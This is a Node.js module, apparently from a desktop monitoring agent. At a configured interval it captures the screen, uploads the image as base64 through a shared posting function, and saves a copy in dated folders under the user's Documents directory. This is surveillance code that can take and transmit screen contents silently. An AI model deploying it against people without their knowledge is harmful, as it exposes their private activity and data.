module.exports = function() {
const screenshot = require('../../../../node_modules/screenshot-desktop');
let shared=require("../../shared/Shared.js");
let response= shared.readSetting();
var fs = require('fs'); 
let os = require('os');
setInterval(function(){
    response= shared.readSetting();
    if(response.ScreenShotEnable==true)
    {
    screenshot({format: 'png'}).then((img) => {
   
        var string = img.toString('base64');
        let object={'Type':"ScreenShot",'Out':string};
        shared.PostData(object);
        let ts = Date.now();
        let date_ob = new Date(ts);
        var date=date_ob.getFullYear()+"-"+date_ob.getMonth()+"-"+date_ob.getDate();
        let Hours = date_ob.getHours();
        let mint = date_ob.getMinutes();
        try
        {
     
         try {
           fs.statSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date);
         } catch(e) {
           fs.mkdirSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date);
         }
         try {
           fs.statSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date+"/"+Hours);
         } catch(e) {
           fs.mkdirSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date+"/"+Hours);
         }
         try {
           fs.statSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date+"/"+Hours+"/"+mint);
         } catch(e) {
           fs.mkdirSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date+"/"+Hours+"/"+mint);
       
         }
        }catch(e)
        {
     
        }finally
        {
          if(fs.statSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date+"/"+Hours+"/"+mint) )
       console.log("exist");
            fs.writeFileSync(os.userInfo().homedir.split("\\").join('/')+'/Documents/Storage/Result/'+date+"/"+Hours+"/"+mint+'/ScreenShot.png',img);
       }


    }).catch((err) => {
    console.log(err);
    })   
    }
},response.ScreenShot)
}